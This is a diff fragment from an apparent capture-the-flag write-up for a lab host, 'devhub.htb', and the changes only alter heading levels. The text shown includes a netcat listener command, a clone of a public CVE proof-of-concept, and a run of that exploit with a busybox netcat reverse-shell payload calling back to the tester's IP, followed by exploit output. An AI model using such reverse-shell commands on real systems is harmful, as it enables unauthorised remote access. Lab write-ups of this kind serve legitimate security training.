@@ -72,25 +72,25 @@ This reveals the version is 1.4.2. A search for related exploits reveals the fol
 
 The documentation show's how we can obtain code execution on the server. Let's first start a listener before modifying the exploit so that we can execute a reverse shell:
 
-## Starting the listener:
+#### Starting the listener:
 
 ```
 nc -lvnp 4444
 ```
 
-## Downloading the exploit:
+#### Downloading the exploit:
 
 ```
 git clone https://github.com/boroeurnprach/CVE-2026-23744-PoC
 ```
 
-## Running the exploit:
+#### Running the exploit:
 
 ```
 python3 exploit.py devhub.htb 'busybox nc 10.10.14.28 4444 -e /bin/bash'
 ```
 
-## Exploit output:
+#### Exploit output:
 
 ```
 [*] Waiting for server to start on port 6274...
@@ -100,7 +100,7 @@ python3 exploit.py devhub.htb 'busybox nc 10.10.14.28 4444 -e /bin/bash'
 [+] Payload sent.
 ```
 
-## Listener output:
+#### Listener output:
 
 ```
 Listening on 0.0.0.0 4444
